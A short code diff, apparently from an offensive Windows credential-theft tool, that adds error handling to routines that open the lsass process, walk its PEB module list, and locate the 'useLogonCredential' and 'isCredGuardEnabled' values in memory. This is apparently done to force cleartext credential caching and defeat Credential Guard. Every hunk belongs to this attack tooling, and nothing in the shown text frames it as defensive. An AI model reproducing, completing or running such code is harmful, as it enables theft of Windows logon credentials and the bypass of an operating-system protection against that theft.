@@ -152,6 +152,10 @@ uintptr_t CustomGetModuleHandle(HANDLE hProcess, const char* dll_name) {
     void* pebaddress = *(void**)peb_pointer;
     void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
     void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);
+    //if (ldr_adress == NULL) {
+    //    printf("[-] PEB structure is not readable.\n");
+    //    exit(0);
+    //}
     void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
     void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);
 
@@ -689,6 +693,10 @@ void exec(const char* option, bool debug) {
     int isCredGuardEnabled_Offset = isCredGuardEnabled + offset + 12;
 
     HANDLE lsassHandle = GetProcessByName(proc_name);
+    if (lsassHandle == 0) {
+        printf("[-] It was not possible to get lsass handle.");
+        exit(0);
+    }
     uintptr_t hModule = CustomGetModuleHandle(lsassHandle, dllName);
     uintptr_t useLogonCredential_Address = hModule + useLogonCredential_Offset;
     uintptr_t isCredGuardEnabled_Address = hModule + isCredGuardEnabled_Offset;
